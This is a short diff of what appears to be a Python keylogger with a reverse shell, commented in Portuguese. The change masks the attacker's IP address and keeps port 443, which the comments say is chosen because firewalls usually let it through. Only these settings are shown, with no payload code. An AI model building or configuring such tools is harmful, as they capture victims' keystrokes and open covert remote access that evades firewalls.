@@ -9,7 +9,7 @@ from pynput import keyboard
 from datetime import datetime
 # shell reverso
 # IP para se conectar com a máquina vitima (Ip ataque)
-IP = "192.168.2.116";
+IP = "192.168.2.xxx";
 # muito utilizada para conexões em sites, e o firewall normalmente deixa passar
 # não é regra para todo mundo
 PORT = 443;
